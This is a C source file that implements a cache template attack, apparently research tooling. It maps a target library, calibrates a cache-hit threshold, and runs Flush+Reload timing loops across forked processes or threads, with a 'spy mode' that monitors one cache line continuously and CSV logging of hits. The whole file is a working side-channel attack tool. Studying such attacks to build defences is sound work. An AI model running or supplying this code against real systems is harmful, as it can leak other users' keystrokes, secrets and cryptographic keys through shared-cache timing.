 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>

#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif

static int shared_data_shm_fd = 0;
#endif

#include "calibrate.h"

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

/* Forward declarations */
static void attack_master(size_t range, bool spy, useconds_t
    offset_update_time);
static void attack_slave(libflush_session_t* libflush_session, uint8_t* m,
    size_t threshold, size_t offset, size_t number_of_tests, bool show_timing,
    FILE* logfile);

/* Shared data */
typedef struct shared_data_s {
  unsigned int current_offset;
  lock_t lock;
} shared_data_t;

static shared_data_t* shared_data = NULL;

#ifdef WITH_THREADS
static shared_data_t shared_data_tmp;
void* attack_thread(void* ptr);
#endif

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS] <library>\n", argv[0]);
  fprintf(stdout, "Application Options:\n");
  fprintf(stdout, "\t-r, -range <range>\t Address range\n");
  fprintf(stdout, "\t-o, -offset <offset>\t Offset\n");
  fprintf(stdout, "\t-f, -fork <value>\t Fork value times\n");
  fprintf(stdout, "\t-t, -threshold <value>\t Threshold\n");
  fprintf(stdout, "\t-n, -number-of-tests <value>\t Number of tests per address\n");
  fprintf(stdout, "\t-u, -offset-update-time <value>\t Interval in seconds to update the offset\n");
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu\n");
  fprintf(stdout, "\t-s, -spy\t Spy mode\n");
  fprintf(stdout, "\t-z, -show-timing\t Show timing information\n");
  fprintf(stdout, "\t-l, -logfile <value>\t Logfile in csv format\n");
  fprintf(stdout, "\t-h, -help\t Help page\n");
}

int main(int argc, char* argv[])
{
  /* Define parameters */
  char* filename = NULL;
  size_t offset  = 0;
  size_t range   = 0;
  size_t threshold = 0;
  size_t number_of_forks = 1;
  int cpu = BIND_TO_CPU;
  useconds_t offset_update_time = OFFSET_UPDATE_TIME;
  size_t number_of_tests = NUMBER_OF_TESTS;
  bool spy = false;
  bool show_timing = SHOW_TIMING;
  FILE* logfile = NULL;

  /* Parse arguments */
  static const char* short_options = "o:r:f:t:c:u:n:l:szh";
  static struct option long_options[] = {
    {"offset",                required_argument, NULL, 'o'},
    {"range",                 required_argument, NULL, 'r'},
    {"fork",                  required_argument, NULL, 'f'},
    {"threshold",             required_argument, NULL, 't'},
    {"cpu",                   required_argument, NULL, 'c'},
    {"number-of-tests",       required_argument, NULL, 'n'},
    {"offset-update-time",    required_argument, NULL, 'u'},
    {"logfile",               required_argument, NULL, 'l'},
    {"spy",                   no_argument, NULL, 's'},
    {"show-timing",           no_argument, NULL, 'z'},
    {"help",                  no_argument, NULL, 'h'},
    { NULL,                   0, NULL, 0}
  };

  opterr = 0;

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'o':
        {
          long unsigned int offset_p = 0;
          if (!sscanf(optarg,"%lx",&offset_p)) {
            fprintf(stderr, "Could not parse offset parameter: %s\n", optarg);
            return -1;
          }

          offset = (size_t) offset_p;
        }
        break;
      case 'r':
        {
          void* start = NULL;
          void* end   = NULL;
          if (!sscanf(optarg, "%p-%p", &start, &end)) {
            fprintf(stderr, "Could not parse range parameter: %s\n", optarg);
            return -1;
          }

          range = (size_t) end - (size_t) start;
        }
        break;
      case 'f':
        if (!sscanf(optarg,"%zu", &number_of_forks)) {
          fprintf(stderr, "Could not parse fork parameter: %s\n", optarg);
          return -1;
        }
        break;
      case 't':
        {
          if (!sscanf(optarg,"%zu", &threshold)) {
            fprintf(stderr, "Could not parse threshold parameter: %s\n", optarg);
            return -1;
          }
        }
        break;
      case 'c':
        cpu = atoi(optarg);
        break;
      case 'n':
        number_of_tests = atoi(optarg);
        break;
      case 'u':
        {
          float offset_update_time_seconds;
          if (!sscanf(optarg,"%f", &offset_update_time_seconds)) {
            fprintf(stderr, "Could not parse offset-update-time parameter: %s\n", optarg);
            return -1;
          }

          offset_update_time = offset_update_time_seconds * 1000 * 1000;
        }
        break;
      case 'l':
        logfile = fopen(optarg, "w+");
        if (logfile == NULL) {
          fprintf(stderr, "Error: Could not open logfile '%s'\n", optarg);
          return -1;
        }
        break;
      case 's':
        spy = true;
        break;
      case 'z':
        show_timing = true;
        break;
      case 'h':
        print_help(argv);
        return 0;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Validate parameters */
  if (optind >= argc) {
    fprintf(stderr, "Error: No library passed\n");
    return 0;
  }

  filename = argv[optind];

  if (logfile != NULL) {
    if (show_timing == false) {
      fprintf(logfile, "Offset,Hits\n");
    } else {
      fprintf(logfile, "Time,Offset,Reload\n");
    }
  }

  /* Setup shared memory */
#ifdef WITH_THREADS
  shared_data = &shared_data_tmp;
#else
#ifdef WITH_ANDROID
  shared_data_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
  if (shared_data_shm_fd < 0) {
    fprintf(stderr, "Error: Could not create shared memory.\n");
    return -1;
  }
  ioctl(shared_data_shm_fd, ASHMEM_SET_NAME, "shared_data");
  ioctl(shared_data_shm_fd, ASHMEM_SET_SIZE, sizeof(shared_data));

  shared_data = mmap(NULL, sizeof(shared_data), PROT_READ | PROT_WRITE,
      MAP_SHARED, shared_data_shm_fd, 0);
  if (shared_data == MAP_FAILED) {
    fprintf(stderr, "Error: Could not map shared memory.\n");
    return -1;
  }
#else
  /* Create shared memory for current offset */
  shared_data_shm_fd = shmget(IPC_PRIVATE, sizeof(shared_data_t), IPC_CREAT | SHM_R | SHM_W);
  if (shared_data_shm_fd == -1) {
    fprintf(stderr, "Error: Could not get shared memory segment.\n");
    return -1;
  }

  shared_data = shmat(shared_data_shm_fd, NULL, 0);
  if (shared_data == (void*) -1) {
    fprintf(stderr, "Error: Could not attach shared memory.\n");
    return -1;
  }
#endif
#endif

  if (shared_data == NULL) {
    fprintf(stderr, "Error: Implementation error: shared_data is not set.\n");
    return -1;
  }

  tal_unlock(&(shared_data->lock));

  /* Initialize libflush */
  libflush_session_t* libflush_session;
  libflush_init(&libflush_session, NULL);

  /* Open file */
  int fd = open(filename, O_RDONLY);
  if (fd == -1) {
    fprintf(stderr, "Could not open file: %s\n", filename);
    return -1;
  }

  /* If no range is given, map the whole file */
  if (range == 0) {
    struct stat filestat;
    if (fstat(fd, &filestat) == -1) {
      fprintf(stderr, "Error: Could not obtain file information.\n");
      return -1;
    }

    range = filestat.st_size;
  }

  /* Map file */
  uint8_t* m = (uint8_t*) mmap(0, range + offset, PROT_READ, MAP_SHARED, fd, 0);
  if (m == NULL) {
    fprintf(stderr, "Could not map file: %s\n", filename);
    return -1;
  }
  offset = offset & ~(0x3F);
  m += offset;

  /* Start calibration */
  if (threshold == 0) {
    fprintf(stdout, "[x] Start calibration... ");
    threshold = calibrate(libflush_session);
    fprintf(stdout, "%zu\n", threshold);
  }

  /* Start cache template attack */
  fprintf(stdout, "[x] Filename: %s\n", filename);
  fprintf(stdout, "[x] Offset: %zu\n", offset);
  fprintf(stdout, "[x] Range: %zu\n", range);
  fprintf(stdout, "[x] Threshold: %zu\n", threshold);
  fprintf(stdout, "[x] Spy-mode: %s\n", (spy == true) ? "yes" : "no");
  fflush(stdout);

  /* Enable spy mode */
  if (spy == true) {
    range = 1;
  }

  /* Bind to CPU */
  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  /* Start master and slaves */
#ifndef WITH_THREADS
  pid_t pids[number_of_forks+1];
  for (unsigned int i = 0; i < number_of_forks+1; i++) {
    pids[i] = fork();

    if (pids[i] == -1) {
      fprintf(stderr, "Error: Failed to fork %d process\n", (unsigned int) i);
      exit(-2);
    } else if (pids[i] == 0) {
      libflush_bind_to_cpu((cpu + i) % number_of_cpus);

      if (i == 0) {
        fprintf(stdout, "[x] Master process %d with pid %d\n", (unsigned int) i, getpid());
        fflush(stdout);
        attack_master(range, spy, offset_update_time);
      } else {
#if LOCK_ROUND_ROBIN == 1
        lock_attr_t attr;
        attr.number_of_forks = number_of_forks;
        attr.fork_idx = i - 1;
        tal_init(&(shared_data->lock), &attr);
#else
        tal_init(&(shared_data->lock), NULL);
#endif

        fprintf(stdout, "[x] Slave process %d with pid %d\n", (unsigned int) i, getpid());
        fflush(stdout);

        attack_slave(libflush_session, m, threshold, offset, number_of_tests,
            show_timing, logfile);
      }

      exit(0);
    }
  }

  /* Wait for slaves to finish */
  int status = 0;
  pid_t wait_pid = 0;
  while (true) {
    wait_pid = waitpid(pids[0], &status, WNOHANG|WUNTRACED);
    if (wait_pid == -1) {
      break;
    } else if (wait_pid == 0) {
      sleep(5);
    } else if (wait_pid == pids[0]) {
      printf("[x] Exit status of %d was %d\n", wait_pid, status);

      for (unsigned int i = 1; i < number_of_forks+1; i++) {
        if (kill(pids[i], SIGKILL) == -1) {
          fprintf(stderr, "Error: Could not kill process %d\n", pids[i]);
        }
      }

      break;
    }
  }

#else
  pthread_t* threads = calloc(number_of_forks, sizeof(pthread_t));
  if (threads == NULL) {
    return -1;
  }

  thread_data_t* thread_data = calloc(number_of_forks, sizeof(thread_data_t));
  if (thread_data == NULL) {
    return -1;
  }

  for (unsigned int i = 0; i < number_of_forks+1; i++) {
    thread_data[i].type = (i == 0) ? THREAD_FLUSH_AND_RELOAD : THREAD_FLUSH;
    thread_data[i].m = m;
    thread_data[i].range = range;
    thread_data[i].threshold = threshold;
    thread_data[i].offset = offset;
    thread_data[i].cpu_id = (cpu + i) % number_of_cpus;
    thread_data[i].spy = spy;
    thread_data[i].offset_update_time = offset_update_time;
    thread_data[i].number_of_tests = number_of_tests;
    thread_data[i].show_timing = show_timing;
    thread_data[i].logfile = logfile;
    thread_data[i].libflush_session = libflush_session;

    fprintf(stdout, "[x] Create thread %u\n", i);
    if (pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]) != 0) {
      return -1;
    }
  }

  pthread_join(threads[0], NULL);

  free(threads);
  free(thread_data);
#endif

#ifndef WITH_THREADS
#ifdef WITH_ANDROID
  if (shared_data != NULL) {
    munmap(shared_data, sizeof(unsigned int));
  }

  if (shared_data_shm_fd != -1) {
    close(shared_data_shm_fd);
  }
#else
  if (shared_data != NULL) {
    shmdt(shared_data);
  }
  if (shared_data_shm_fd != -1) {
    shmctl(shared_data_shm_fd, IPC_RMID, 0);
  }
#endif
#endif

  /* Clean-up */
  if (logfile != NULL) {
    fclose(logfile);
  }

  munmap(m, range);
  close(fd);

  /* Terminate libflush */
  libflush_terminate(libflush_session);

  return 0;
}

#ifdef WITH_THREADS
void*
attack_thread(void* ptr)
{
  thread_data_t* thread_data = (thread_data_t*) ptr;

  libflush_bind_to_cpu(thread_data->cpu_id);

  if (thread_data->type == THREAD_FLUSH_AND_RELOAD) {
    attack_master(thread_data->range, thread_data->spy,
        thread_data->offset_update_time);
  } else if (thread_data->type == THREAD_FLUSH) {
    attack_slave(thread_data->libflush_session, thread_data->m,
        thread_data->threshold, thread_data->offset,
        thread_data->number_of_tests, thread_data->show_timing,
        thread_data->logfile);
  }

  pthread_exit(NULL);
}
#endif

static void
attack_master(size_t range, bool spy, useconds_t offset_update_time)
{
  do {
    for (shared_data->current_offset = 0; shared_data->current_offset < range; shared_data->current_offset += 64) {
      usleep(offset_update_time);
    }
  } while (spy == true);
}

static void
attack_slave(libflush_session_t* libflush_session, uint8_t* m, size_t threshold,
    size_t offset, size_t number_of_tests, bool show_timing, FILE* logfile)
{
  libflush_init(&libflush_session, NULL);
  size_t current_offset = shared_data->current_offset;

  /* Run Flush and reload */
  do {
    while (current_offset == shared_data->current_offset) {
      tal_lock(&(shared_data->lock));
      uint64_t hit_counter = 0;

      int pause = 0;
      for (unsigned int i = 0; i < number_of_tests; i++) {
        uint64_t count = libflush_reload_address_and_flush(libflush_session, m + current_offset);
        if (count < threshold) {
          if (pause > 1) {
            hit_counter++;
          }
          pause = 0;
        } else {
          pause++;
        }

        if (show_timing == true) {
          struct timespec time = {0,0};
          clock_gettime(CLOCK_MONOTONIC, &time);
          double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);

          fprintf(stdout, "%.5f: %8p - %" PRIu64 "\n", measured_time, (void*)
              (offset + current_offset), count);
          fflush(stdout);

          if (logfile != NULL) {
            fprintf(logfile, "%.f,%p,%" PRIu64 "\n", measured_time, (void*)
                (offset + current_offset), count);
          }
        }

        for (unsigned int u = 0; u < NUMBER_OF_YIELDS; u++) {
          sched_yield();
        }
      }

      if (hit_counter > 0 && show_timing == false) {
        fprintf(stdout, "%8p - %" PRIu64 "\n", (void*) (offset + current_offset), hit_counter);
        fflush(stdout);

        if (logfile != NULL) {
          fprintf(logfile, "%8p - %" PRIu64 "\n", (void*) (offset +
                current_offset), hit_counter);
        }
      }

      tal_unlock(&(shared_data->lock));
    }

    current_offset = shared_data->current_offset;
  } while (true);
}
